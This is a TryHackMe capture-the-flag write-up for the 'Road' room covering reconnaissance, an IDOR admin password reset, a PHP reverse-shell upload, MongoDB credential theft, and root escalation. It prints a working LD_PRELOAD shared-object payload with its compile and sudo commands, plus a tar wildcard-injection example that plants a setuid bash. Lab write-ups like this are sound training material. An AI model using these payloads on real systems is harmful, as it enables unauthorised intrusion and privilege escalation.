---
title: "Road - TryHackMe Writeup"
date: 2026-06-17
draft: false
summary: "Writeup for Road CTF challenge on TryHackMe."
tags: ["linux", "sudo", "idor", "unrestricted file upload"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/road/cover.webp"
  caption: "Road TryHackMe Challenge"
  alt: "Road cover"
platform: "TryHackMe"
author: "Moiz Bootwala"
---

Inspired by a real-world pentesting engagement
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/road

## Reconnaissance

I performed an nmap aggressive scan on the target to find open ports and services running on them.

```
nmap -A -p- TARGET --min-rate 10000 -oN road.nmap
```

| **Port** | **Service** |
| -------- | ----------- |
| 22       | ssh         |
| 80       | http        |

![performing an nmap scan](https://cdn.ziomsec.com/road/1.webp)

## Initial Access

### Enumerating The Web Application

I accessed the web application through my browser

![accessing the web application](https://cdn.ziomsec.com/road/2.webp)

The "*Merchant Central*" button took me to an login page with an option to register a new user.

![admin login panel](https://cdn.ziomsec.com/road/3.webp)

I then fuzzed for other directories using ffuf

```
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt 
```

![fuzzing hidden directories](https://cdn.ziomsec.com/road/4.webp)

I tried accessing the *phpMyAdmin* endpoint but was denied access

![accessing phpmyadmin page](https://cdn.ziomsec.com/road/5.webp)

I then went back to the login panel and registered a new user

![registering a new user](https://cdn.ziomsec.com/road/6.webp)

After signing in, I got access to a dashboard

![accessing the dashboard](https://cdn.ziomsec.com/road/7.webp)

I entered a number on the search bar and got an interesting url....

![attempting to track order](https://cdn.ziomsec.com/road/8.webp)

I attempted different LFI and RFI payloads but both failed. Hence, I moved back to the web app and further explored different dashboard endpoints/links. I clicked on profiles and noticed a feature to upload a profile pic which was restricted for the admin user. This also revealed the admin mail.

![accessing profile page](https://cdn.ziomsec.com/road/9.webp)

![discovering the admin e-mail](https://cdn.ziomsec.com/road/10.webp)

I had access to an endpoint that allowed me to reset my credentials.

![resetting user credential](https://cdn.ziomsec.com/road/11.webp)

Since I had the admin email, and this feature didn't ask for the current password, I attempted to change the admin creds by changing the mail in the reset request using Burp Suite.

![capturing the password reset request on burp](https://cdn.ziomsec.com/road/12.webp)

![sending a password change request for admin](https://cdn.ziomsec.com/road/13.webp)

After resetting the password, I was able to log in as admin.

![accessing the admin dashboard](https://cdn.ziomsec.com/road/14.webp)

### Getting A Reverse Shell

As admin, I could upload a profile pic. Since the application ran on PHP, I uploaded a php reverse shell payload using the profile image feature.

![uploading php reverse shell payload](https://cdn.ziomsec.com/road/15.webp)

To trigger the payload, I fuzzed for directories inside the `/v2/` endpoint. This revealed an interesting dir called `profileimages`

```
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

![fuzzing directories that could contain profile pic](https://cdn.ziomsec.com/road/16.webp)

I used the newly discovered endpoint to trigger the reverse shell payload and got a reverse shell on a local listener.

![triggering the reverse shell payload](https://cdn.ziomsec.com/road/17.webp)

![getting a reverse shell](https://cdn.ziomsec.com/road/18.webp)

After getting a reverse shell, I navigated to the home directory of the user `webdeveloper`, and captured the user flag.

![capturing the user flag](https://cdn.ziomsec.com/road/19.webp)

## Privilege Escalation

### Shell As Webdeveloper

I listed listening ports and found 2 interesting services running, mysql(3306) and mongodb(27017).

```
ss -tulnp
```

![listing services listening on different ports](https://cdn.ziomsec.com/road/20.webp)

I also found a file related to mongodb in the `/tmp` directory.

![discovering the mongo sock in tmp directory](https://cdn.ziomsec.com/road/21.webp)

I connected to the mongo db and found the credentials for the webdeveloper user.

```
mongo
show dbs
use backup
show collections
db.user.find()
```

![discovering user credentials](https://cdn.ziomsec.com/road/22.webp)

I then used this credential to access the machine via SSH.

```
ssh webdeveloper@TARGET
```

![logging into the target as webdeveloper](https://cdn.ziomsec.com/road/23.webp)

### Escalating To Root

I listed my sudo privs using `sudo -l`

![listing sudo privs](https://cdn.ziomsec.com/road/24.webp)

The `env_keep+=LD_PRELOAD` option can be used to escalate my privs. I then analyzed the binary that I was allowed to execute and found the command it executed.

```
cat /usr/bin/sky_backup_utility
```

![analyzing the binary](https://cdn.ziomsec.com/road/25.webp)

I also analyzed this using `pspy64`

```
./pspy64
```

![analyzing commands executed by the binary](https://cdn.ziomsec.com/road/26.webp)

Initially, I thought that there were 2 ways of escalating my privs:
1. Abusing the `LD_PRELOAD` option
2. Abusing the tar with wildcard execution

However, after looking at the complete command that's being executed, I realized the tar with wildcard exploit wouldn't work. This is because, when I would attempt to craft an exploit; for example:

```
cd /var/www/html
echo 'cp /bin/bash /tmp/bash;chmod u+s /tmp/bash' > evil.sh
touch "/var/www/html/--checkpoint=1"
touch "var/www/html/--checkpoint-action=exec=sh evil.sh"
```

Then, upon executing the command, the shell would expand `/var/www/html/*`, and every filename would get prefixed with the full path, so tar would receive:

```
/var/www/html/--checkpoint=1
```

This starts with `/`, so tar treats it as a filepath to archive, not a flag. Wildcard injection only works when tar is invoked with a relative glob (`cd /dir && tar *`), where filenames expand without a path prefix and tar mistakes them for CLI options.

So, after ruling out the tar exploit, I proceeded with exploiting `LD_PRELOAD`. I created the following C exploit that spawned a bash shell:

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(){
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

I compiled this into a `.so` file

```
gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
```

![compiling the payload](https://cdn.ziomsec.com/road/27.webp)

I then ran the exploit to spawn a root shell

```
sudo LD_PRELOAD=/home/webdeveloper/exploit.so /usr/bin/sky_backup_utility
```

![exploiting the vulnerability to gain root shell](https://cdn.ziomsec.com/road/28.webp)

Finally, I captured the root flag

![capturing the root flag](https://cdn.ziomsec.com/road/29.webp)

## Conclusion

That concludes my writeup on Road CTF:
- I abused IDOR to change the password of the admin user
- Then I used the unrestricted file upload feature to upload a reverse shell payload
- Triggering the payload gave me a reverse shell as www-data account
- I discovered the user creds using mongodb
- I then logged in as the webdeveloper user and found I had permission to run a binary as sudo with `LD_PRELOAD` set.
- I abused this to spawn a bash shell as root.

That's it from my end. Until next time.

---
